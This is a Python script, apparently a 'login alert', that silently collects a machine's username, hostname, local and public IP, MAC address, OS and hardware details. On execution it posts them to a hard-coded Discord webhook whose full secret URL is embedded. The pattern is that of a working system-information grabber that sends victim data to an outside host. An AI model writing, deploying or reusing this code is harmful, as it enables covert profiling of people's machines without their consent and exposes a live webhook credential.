import os
import socket
import platform
import requests
import psutil
import uuid
import datetime
import getpass

WEBHOOK_URL = "https://discord.com/api/webhooks/1417097543753662524/islBtmTrgNl2CHmAOlVkX1z9ZOP5c_pyJO3aRJxUvI0942yIm5L2ur-m0iykPn0ennpg"

def get_public_ip():
    try:
        return requests.get("https://api.ipify.org").text
    except:
        return "N/A"

def get_mac_address():
    mac = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff)
                    for ele in range(0, 8*6, 8)][::-1])
    return mac

def get_battery_info():
    try:
        battery = psutil.sensors_battery()
        if battery:
            return f"{battery.percent}% {'Charging' if battery.power_plugged else 'Not Charging'}"
        else:
            return "No Battery"
    except:
        return "N/A"

def get_gpu_info():
    try:
        import GPUtil
        gpus = GPUtil.getGPUs()
        if gpus:
            gpu_info = []
            for gpu in gpus:
                gpu_info.append(f"{gpu.name} | Load: {gpu.load*100:.1f}% | Memory: {gpu.memoryUsed}/{gpu.memoryTotal}MB")
            return "\n".join(gpu_info)
        else:
            return "No GPU detected"
    except:
        return "GPUtil not installed"

def collect_info():
    info = {
        "Username": getpass.getuser(),
        "Hostname": socket.gethostname(),
        "Local IP": socket.gethostbyname(socket.gethostname()),
        "Public IP": get_public_ip(),
        "MAC Address": get_mac_address(),
        "Time": str(datetime.datetime.now()),
        "Battery": get_battery_info(),
        "CPU Usage": f"{psutil.cpu_percent()}%",
        "Memory Usage": f"{psutil.virtual_memory().percent}%",
        "OS": f"{platform.system()} {platform.release()} ({platform.version()})",
        "GPU": get_gpu_info()
    }
    return info

def send_to_discord(info):
    message = "**New Login Detected**\n"
    for key, value in info.items():
        message += f"**{key}:** {value}\n"
    payload = {"content": message}
    try:
        requests.post(WEBHOOK_URL, json=payload)
    except Exception as e:
        print(f"Failed to send message: {e}")

if __name__ == "__main__":
    details = collect_info()
    send_to_discord(details)
